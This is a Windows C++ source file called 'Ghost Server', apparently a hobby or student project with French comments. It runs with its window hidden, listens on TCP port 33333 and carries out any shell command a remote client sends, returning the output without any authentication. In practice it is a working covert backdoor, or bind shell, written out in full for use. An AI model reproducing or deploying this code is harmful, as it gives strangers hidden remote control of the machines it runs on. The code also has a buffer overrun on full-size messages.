// Ghost Server.cpp : Defines the entry point for the application.
//

#undef UNICODE

#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

// Notre ajouts
#include <string>
#include <direct.h>

// https://stackoverflow.com/questions/478898/how-do-i-execute-a-command-and-get-the-output-of-the-command-within-c-using-po
#include <iostream>
#include <stdexcept>
#include <stdio.h>
#include <string>

// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")
// #pragma comment (lib, "Mswsock.lib")

#define DEFAULT_BUFLEN 500000
#define DEFAULT_PORT "33333"

using namespace std;

#include "framework.h"
#include "Ghost Server.h"

#define MAX_LOADSTRING 100

// Global Variables:
HINSTANCE hInst;                                // current instance
WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name

// Forward declarations of functions included in this code module:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // TODO: Place code here.

    // Initialize global strings
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_GHOSTSERVER, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    // Perform application initialization:
    if (!InitInstance (hInstance, nCmdShow))
    {
        return FALSE;
    }

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_GHOSTSERVER));

    MSG msg;

    // Main message loop:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return (int) msg.wParam;
}

std::string exec(const char* cmd) {
    char buffer[128];
    std::string result = "";

    // Notre ajout
    if (cmd[0] == 'c' && cmd[1] == 'd' && cmd[2] == ' ') {
        string directory = "";
        for (int i = 3; i < strlen(cmd); i++) {
            directory += cmd[i];
        }
        _chdir(directory.c_str());
        return "OKAY CHDIR";
    }

    FILE* pipe = _popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    }
    catch (...) {
        _pclose(pipe);
        throw;
    }
    _pclose(pipe);

    // Notre ajout
    if (result == "") {
        return "OKAY";
    }
    return result;
}


//
//  FUNCTION: MyRegisterClass()
//
//  PURPOSE: Registers the window class.
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_GHOSTSERVER));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_GHOSTSERVER);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

//
//   FUNCTION: InitInstance(HINSTANCE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // Store instance handle in our global variable

   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

   if (!hWnd)
   {
      return FALSE;
   }

   // ShowWindow(hWnd, nCmdShow);
   // UpdateWindow(hWnd);

   WSADATA wsaData;
   int iResult;

   SOCKET ListenSocket = INVALID_SOCKET;
   SOCKET ClientSocket = INVALID_SOCKET;

   struct addrinfo* result = NULL;
   struct addrinfo hints;

   int iSendResult;
   char recvbuf[DEFAULT_BUFLEN];
   int recvbuflen = DEFAULT_BUFLEN;

   while (true) {
       // Initialize Winsock
       iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
       if (iResult != 0) {
           printf("WSAStartup failed with error: %d\n", iResult);
           return 1;
       }

       ZeroMemory(&hints, sizeof(hints));
       hints.ai_family = AF_INET;
       hints.ai_socktype = SOCK_STREAM;
       hints.ai_protocol = IPPROTO_TCP;
       hints.ai_flags = AI_PASSIVE;

       // Resolve the server address and port
       iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
       if (iResult != 0) {
           printf("getaddrinfo failed with error: %d\n", iResult);
           WSACleanup();
           return 1;
       }

       // Create a SOCKET for connecting to server
       ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
       if (ListenSocket == INVALID_SOCKET) {
           printf("socket failed with error: %ld\n", WSAGetLastError());
           freeaddrinfo(result);
           WSACleanup();
           return 1;
       }

       // Setup the TCP listening socket
       iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
       if (iResult == SOCKET_ERROR) {
           printf("bind failed with error: %d\n", WSAGetLastError());
           freeaddrinfo(result);
           closesocket(ListenSocket);
           WSACleanup();
           return 1;
       }

       freeaddrinfo(result);

       iResult = listen(ListenSocket, SOMAXCONN);
       if (iResult == SOCKET_ERROR) {
           printf("listen failed with error: %d\n", WSAGetLastError());
           closesocket(ListenSocket);
           WSACleanup();
           return 1;
       }

       // Accept a client socket
       ClientSocket = accept(ListenSocket, NULL, NULL);
       if (ClientSocket == INVALID_SOCKET) {
           printf("accept failed with error: %d\n", WSAGetLastError());
           closesocket(ListenSocket);
           WSACleanup();
           return 1;
       }

       // No longer need server socket
       // closesocket(ListenSocket); Je l'ai mis en commentaire pour continuer à écouter.

       // Receive until the peer shuts down the connection

       do {

           iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
           if (iResult > 0) {
               printf("Bytes received: %d\n", iResult);
               printf("Message from client: ");

               for (int i = 0; i < iResult; i++)
               {
                   printf("%c", recvbuf[i]);
               }
               printf("\n");

               char* cmd = recvbuf;
               cmd[iResult] = '\0';

               // https://stackoverflow.com/questions/478898/how-do-i-execute-a-command-and-get-the-output-of-the-command-within-c-using-po

               string output;
               output = exec(cmd);

               // Echo the buffer back to the sender
               iSendResult = send(ClientSocket, output.c_str(), output.size(), 0);
               if (iSendResult == SOCKET_ERROR) {
                   printf("send failed with error: %d\n", WSAGetLastError());
                   closesocket(ClientSocket);
                   WSACleanup();
                   return 1;
               }
               printf("Bytes sent: %d\n", iSendResult);
           }
           else if (iResult == 0)
               printf("Connection closing...\n");
           else {
               printf("recv failed with error: %d\n", WSAGetLastError());
               closesocket(ClientSocket);
               WSACleanup();
               return 1;
           }

       } while (iResult > 0);

       // shutdown the connection since we're done
       iResult = shutdown(ClientSocket, SD_SEND);
       if (iResult == SOCKET_ERROR) {
           printf("shutdown failed with error: %d\n", WSAGetLastError());
           closesocket(ClientSocket);
           WSACleanup();
           return 1;
       }

       // cleanup
       closesocket(ClientSocket);
       WSACleanup();
   }

   return TRUE;
}

//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE: Processes messages for the main window.
//
//  WM_COMMAND  - process the application menu
//  WM_PAINT    - Paint the main window
//  WM_DESTROY  - post a quit message and return
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_COMMAND:
        {
            int wmId = LOWORD(wParam);
            // Parse the menu selections:
            switch (wmId)
            {
            case IDM_ABOUT:
                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
                break;
            case IDM_EXIT:
                DestroyWindow(hWnd);
                break;
            default:
                return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;
    case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            // TODO: Add any drawing code that uses hdc here...
            EndPaint(hWnd, &ps);
        }
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// Message handler for about box.
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}
